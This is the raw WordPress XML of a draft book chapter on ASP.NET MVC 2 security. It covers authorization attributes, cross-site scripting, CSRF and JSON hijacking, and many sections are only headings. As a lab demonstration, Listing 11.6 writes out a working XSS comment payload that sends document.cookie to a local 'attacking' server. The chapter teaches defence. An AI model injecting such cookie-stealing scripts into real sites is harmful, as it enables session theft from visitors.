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p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="00C24DDD" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>This Chapter covers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="00C24DDD" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Requiring authentication and authorization</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="00C24DDD" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Mitigating Cross Site Scripting attacks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="00C24DDD" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Mitigating Cross Site Request Forgeries</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C24DDD" w:rsidRDefault="00C24DDD" w:rsidP="00C24DDD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Mitigating JSON Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C15A8" w:rsidRDefault="001D6E79" w:rsidP="001D6E79">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Security is an important topic for web developers.  We'll cover two aspects.  The first is traditional management of authentication and authorization. Authentication is ensuring the the user has supplied the proper credentials to access the system.  When a user logs in, usually by providing a username and password, it is authenticated.  Authorization is making a decision about whether a given user has permission to do something with the system.  When a user accesses a resource not available to other users, it has been specifically authorized to do so.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001D6E79" w:rsidRDefault="001D6E79" w:rsidP="001D6E79">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>The second aspect we'll discuss involve common web attack vectors and technical vulnerabilities that allow attackers to bypass authentication or authorization.  There are several attack vectors, but we'll focus on some common ones: cross-site scripting (XSS), cross-site request forgery (CSRF), and a special cross-site request forgery called JSON hijacking.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC071C" w:rsidRDefault="00CC071C" w:rsidP="001D6E79">
      <w:pPr>
        <w:pStyle w:val="Head1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.1 </w:t>
      </w:r>
      <w:r w:rsidR="001D6E79">
        <w:t>Authentication and a</w:t>
      </w:r>
      <w:r w:rsidR="004D5449">
        <w:t>uthorization</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>ASP.NET MVC 2 ships with a filter attribute AuthorizeAttribute that provides out of the box authentication and authorization.  Developers can apply the attribute to actions to restrict access to them.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.1.1 Requiring authentication with AuthorizeAttribute</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>The simplest use of the AuthorizeAttribute only requires that the user be authenticated.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Listing 11.1 Authentication with the AuthorizeAttribute</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004D5449" w:rsidRPr="004D5449" w:rsidRDefault="004D5449" w:rsidP="004D5449">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="004D5449">
        <w:t>[Authorize]</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Pr="004D5449" w:rsidRDefault="004D5449" w:rsidP="00EC5FDA">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="004D5449">
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3368B" w:rsidRDefault="00B3368B" w:rsidP="00B3368B">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.1.2 Requiring authorization with AuthorizeAttribute</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.2 User authorization with the AuthorizeAttribute</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRPr="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.3 Role authorization with the AuthorizeAttribute</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3368B" w:rsidRDefault="00B3368B" w:rsidP="00B3368B">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.1.3 AuthorizeAttribute - how it works</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3368B" w:rsidRDefault="00B3368B" w:rsidP="00B3368B">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.1.4 IAuthorizationFilter</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRPr="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.4 IAuthorizationFilter</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRPr="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B3368B" w:rsidRDefault="00B3368B" w:rsidP="00B3368B">
      <w:pPr>
        <w:pStyle w:val="Head1"/>
      </w:pPr>
      <w:r>
        <w:t>11.2 Cross Site Scripting (XSS)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC5FDA" w:rsidRPr="00EC5FDA" w:rsidRDefault="00EC5FDA" w:rsidP="00EC5FDA">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cross </w:t>
      </w:r>
      <w:r w:rsidR="006E6069">
        <w:t xml:space="preserve">site scripting </w:t>
      </w:r>
      <w:r w:rsidR="00303323">
        <w:t>is a technique where a malicious user manipulates the system so that special JavaScript appears on the vuln</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>erable website - script v</w:t>
      </w:r>
      <w:r w:rsidR="00303323">
        <w:t xml:space="preserve">isiting browsers </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">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to another, conspiring site. The trick is to actually get the script to run on the vulnerable site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="003B62DA" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.2.1 XSS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 attack.  It contains two simple MVC applications.  One is vulne</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve">rable to cross site scripting. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">It features a simple comment submission page. </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>We'll submit JavaScript as part of the comment.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t>Preparing the example</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>When the example Visual Studio solution is run (typically with CTRL-F5), two sites appear in the web browser.  The vulnerable site sets a cookie, ostensibly containing sensitive data. The second site is the attacker.  The attacking site has a page that should read "</w:t>
      </w:r>
      <w:r w:rsidRPr="00620AFB">
        <w:t>No victims yet</w:t>
      </w:r>
      <w:r>
        <w:t>".  After we initiate our attack, it will display the "secret" cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>On the vulnerable site, the cookie has been set with the code i</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>n the Listing 115, traditional cookie-setting code</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.5 Setting an insecure cookie with "secret" data</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRPr="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00620AFB">
        <w:lastRenderedPageBreak/>
        <w:t>public ActionResult Index()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00620AFB">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRPr="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00620AFB">
        <w:t>var cookie = new HttpCookie("mvcinaction", "secret");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00620AFB">
        <w:t>Response.SetCookie(cookie);</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 set, we can play the part of the hacker on the Comments page</w:t>
      </w:r>
      <w:r w:rsidR="00E1282F">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>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8" cstate="print"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4800600" cy="3792220"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:r>
        <w:t>We included a button that will automatically insert a malicious comment in the Comment text area.</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve"> The comment appears in Listing 11.6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.6 A malicious comment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:t xml:space="preserve">A long comment &lt;script&gt;document.write('&lt;img src=http://localhost:8082/attack/register?input=' </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:t>+escape(document.cookie)+ '/&gt;')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00E1282F" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This comment includes a script block.  The script block writes HTML to the browser.  The HTML contains an image whose SRC attribute is not an image at all, but the browser doesn't know that.  The browser sends a request to the attacking server with the cookie in the query string. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>After we save the comment, on the subsequent page where the comment is displayed, the script is executed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>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9" cstate="print"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4800600" cy="3792220"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F"/>
    <w:p w:rsidR="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:r>
        <w:t>We can't see anything strange here, but the nefarious script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r>
        <w:t xml:space="preserve">     |#1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00E1282F">
        <w:tab/>
        <w:t>register?input=' +escape(document.cookie)</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 to the attacking site</w:t>
      </w:r>
      <w:r w:rsidR="00980AE5">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t>When we reload the attacking site, we can see th</w:t>
      </w:r>
      <w:r w:rsidR="00544692">
        <w:t>at our attack has been executed; the other site received our cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00980AE5" w:rsidRPr="00544692" w:rsidRDefault="00544692" w:rsidP="00544692">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>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0" cstate="print"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4800600" cy="1496060"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E1282F" w:rsidRPr="00E1282F" w:rsidRDefault="00E1282F" w:rsidP="00E1282F">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.2.1 Avoiding XSS Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:t>11.2.1.1 ASP.NET MVC Defaults</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:t>11.2.1.2 Encode Everything</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head1"/>
      </w:pPr>
      <w:r>
        <w:t>11.3 Cross Site Request Forgery (XSRF)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.3.1 XSRF In Action</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.3.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="003B62DA">
        <w:t>ValidateAntiForgeryTokenAttribute</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000E7F67" w:rsidRPr="000E7F67" w:rsidRDefault="000E7F67" w:rsidP="000E7F67">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>- when to use: now</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.3.3 JSON Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:t>11.3.3.1 Allow JSON via POST only</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:t>11.3.3.2 Override defaults for GET access</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003B62DA" w:rsidRPr="003B62DA" w:rsidRDefault="003B62DA" w:rsidP="003B62DA">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.3.3.3 </w:t>
      </w:r>
      <w:r w:rsidR="00D32D97">
        <w:t>Modifying JSON response</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="003B62DA" w:rsidRPr="003B62DA"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653" w:rsidRDefault="004C6653">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C6653" w:rsidRDefault="004C6653"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="004C6653" w:rsidRDefault="004C6653">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C6653" w:rsidRDefault="004C665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653" w:rsidRDefault="004C6653">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C6653" w:rsidRDefault="004C6653"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="004C6653" w:rsidRDefault="004C6653">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C6653" w:rsidRDefault="004C665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5A16A8"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0648E">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9E1636">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1/9/2010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9E1636">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1/9/2010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0648E">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7650"/>
  </w:hdrShapeDefaults>
  <w:footnotePr>
    <w:numRestart w:val="eachSect"/>
    <w:footnote w:id="-1"/>
    <w:footnote w:id="0"/>
  </w:footnotePr>
  <w:endnotePr>
    <w:endnote w:id="-1"/>
    <w:endnote w:id="0"/>
  </w:endnotePr>
  <w:compat/>
  <w:rsids>
    <w:rsidRoot w:val="00B3368B"/>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C29BD"/>
    <w:rsid w:val="000E63C0"/>
    <w:rsid w:val="000E6D5F"/>
    <w:rsid w:val="000E7F67"/>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D6E79"/>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B6FE6"/>
    <w:rsid w:val="002D24E6"/>
    <w:rsid w:val="002D28DB"/>
    <w:rsid w:val="002F1201"/>
    <w:rsid w:val="002F4D34"/>
    <w:rsid w:val="00303323"/>
    <w:rsid w:val="00305BDC"/>
    <w:rsid w:val="0031190B"/>
    <w:rsid w:val="00316128"/>
    <w:rsid w:val="003217CA"/>
    <w:rsid w:val="00326F66"/>
    <w:rsid w:val="00327B8E"/>
    <w:rsid w:val="00331DA7"/>
    <w:rsid w:val="00360455"/>
    <w:rsid w:val="00363155"/>
    <w:rsid w:val="00376157"/>
    <w:rsid w:val="003848AA"/>
    <w:rsid w:val="003A1EA1"/>
    <w:rsid w:val="003A36BE"/>
    <w:rsid w:val="003A3CE7"/>
    <w:rsid w:val="003B62DA"/>
    <w:rsid w:val="003C2391"/>
    <w:rsid w:val="003C4FE4"/>
    <w:rsid w:val="003E4AE2"/>
    <w:rsid w:val="003F3294"/>
    <w:rsid w:val="00411C9E"/>
    <w:rsid w:val="004216EF"/>
    <w:rsid w:val="00447B18"/>
    <w:rsid w:val="00453B8A"/>
    <w:rsid w:val="00471E42"/>
    <w:rsid w:val="00472589"/>
    <w:rsid w:val="0048007C"/>
    <w:rsid w:val="00491541"/>
    <w:rsid w:val="00491BFB"/>
    <w:rsid w:val="00495AD7"/>
    <w:rsid w:val="00496FD1"/>
    <w:rsid w:val="004A44C7"/>
    <w:rsid w:val="004C330F"/>
    <w:rsid w:val="004C6653"/>
    <w:rsid w:val="004D5449"/>
    <w:rsid w:val="005063F2"/>
    <w:rsid w:val="0050648E"/>
    <w:rsid w:val="00511E7A"/>
    <w:rsid w:val="00516647"/>
    <w:rsid w:val="00517E4D"/>
    <w:rsid w:val="00544692"/>
    <w:rsid w:val="00553572"/>
    <w:rsid w:val="005A16A8"/>
    <w:rsid w:val="005A2A40"/>
    <w:rsid w:val="005A5837"/>
    <w:rsid w:val="005B1BA2"/>
    <w:rsid w:val="005C65A8"/>
    <w:rsid w:val="005D2F86"/>
    <w:rsid w:val="005D3A9F"/>
    <w:rsid w:val="005D7972"/>
    <w:rsid w:val="005F1BFA"/>
    <w:rsid w:val="006024A5"/>
    <w:rsid w:val="006150B4"/>
    <w:rsid w:val="006155CC"/>
    <w:rsid w:val="00620AFB"/>
    <w:rsid w:val="006305BF"/>
    <w:rsid w:val="0064126F"/>
    <w:rsid w:val="00644D70"/>
    <w:rsid w:val="00652905"/>
    <w:rsid w:val="00656211"/>
    <w:rsid w:val="006664F9"/>
    <w:rsid w:val="00683071"/>
    <w:rsid w:val="00693F51"/>
    <w:rsid w:val="006A3B75"/>
    <w:rsid w:val="006B719F"/>
    <w:rsid w:val="006C15A8"/>
    <w:rsid w:val="006C619B"/>
    <w:rsid w:val="006D70D7"/>
    <w:rsid w:val="006D7A63"/>
    <w:rsid w:val="006E1E21"/>
    <w:rsid w:val="006E57C0"/>
    <w:rsid w:val="006E6069"/>
    <w:rsid w:val="006E6B97"/>
    <w:rsid w:val="006F31AF"/>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578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8F41A2"/>
    <w:rsid w:val="0090208D"/>
    <w:rsid w:val="0092458C"/>
    <w:rsid w:val="0093415A"/>
    <w:rsid w:val="009354C8"/>
    <w:rsid w:val="009378B5"/>
    <w:rsid w:val="00957AA4"/>
    <w:rsid w:val="00970301"/>
    <w:rsid w:val="00976212"/>
    <w:rsid w:val="00977424"/>
    <w:rsid w:val="00980AE5"/>
    <w:rsid w:val="00992F78"/>
    <w:rsid w:val="009C1AA4"/>
    <w:rsid w:val="009C31BD"/>
    <w:rsid w:val="009E0D29"/>
    <w:rsid w:val="009E1636"/>
    <w:rsid w:val="009E1DFE"/>
    <w:rsid w:val="009F0DB6"/>
    <w:rsid w:val="009F522C"/>
    <w:rsid w:val="00A009DE"/>
    <w:rsid w:val="00A31B4E"/>
    <w:rsid w:val="00A34F3E"/>
    <w:rsid w:val="00A45365"/>
    <w:rsid w:val="00A60A34"/>
    <w:rsid w:val="00A74BA3"/>
    <w:rsid w:val="00A91949"/>
    <w:rsid w:val="00A94B75"/>
    <w:rsid w:val="00A951A5"/>
    <w:rsid w:val="00AA4ED3"/>
    <w:rsid w:val="00AB0005"/>
    <w:rsid w:val="00AB5D6D"/>
    <w:rsid w:val="00AB690F"/>
    <w:rsid w:val="00AD0BF4"/>
    <w:rsid w:val="00AD4761"/>
    <w:rsid w:val="00AF3376"/>
    <w:rsid w:val="00B07495"/>
    <w:rsid w:val="00B1107D"/>
    <w:rsid w:val="00B12E60"/>
    <w:rsid w:val="00B15E16"/>
    <w:rsid w:val="00B177F2"/>
    <w:rsid w:val="00B25193"/>
    <w:rsid w:val="00B252B7"/>
    <w:rsid w:val="00B3368B"/>
    <w:rsid w:val="00B41619"/>
    <w:rsid w:val="00B5680B"/>
    <w:rsid w:val="00B5796D"/>
    <w:rsid w:val="00B62E65"/>
    <w:rsid w:val="00B819F4"/>
    <w:rsid w:val="00B92776"/>
    <w:rsid w:val="00BA72AD"/>
    <w:rsid w:val="00BB1AF0"/>
    <w:rsid w:val="00BC232F"/>
    <w:rsid w:val="00BC3385"/>
    <w:rsid w:val="00BD3DFF"/>
    <w:rsid w:val="00BE5771"/>
    <w:rsid w:val="00C06310"/>
    <w:rsid w:val="00C24DDD"/>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C071C"/>
    <w:rsid w:val="00CC0E37"/>
    <w:rsid w:val="00CD4688"/>
    <w:rsid w:val="00CF36AC"/>
    <w:rsid w:val="00D01048"/>
    <w:rsid w:val="00D02910"/>
    <w:rsid w:val="00D123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282F"/>
    <w:rsid w:val="00E161B5"/>
    <w:rsid w:val="00E1667E"/>
    <w:rsid w:val="00E26863"/>
    <w:rsid w:val="00E35BED"/>
    <w:rsid w:val="00E36175"/>
    <w:rsid w:val="00E611BA"/>
    <w:rsid w:val="00E66CD8"/>
    <w:rsid w:val="00E80F79"/>
    <w:rsid w:val="00E83ABC"/>
    <w:rsid w:val="00E874F5"/>
    <w:rsid w:val="00EA7D43"/>
    <w:rsid w:val="00EC5FDA"/>
    <w:rsid w:val="00EE005A"/>
    <w:rsid w:val="00EE55F1"/>
    <w:rsid w:val="00EE7B2B"/>
    <w:rsid w:val="00EF1CFC"/>
    <w:rsid w:val="00F07E30"/>
    <w:rsid w:val="00F153CD"/>
    <w:rsid w:val="00F160C2"/>
    <w:rsid w:val="00F209DA"/>
    <w:rsid w:val="00F2761C"/>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19A5F-FB3E-44D2-856A-7EB8FD4B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271</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8</cp:revision>
  <cp:lastPrinted>2001-01-25T15:37:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2010-01-03T03:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2010-01-11T04:02:00Z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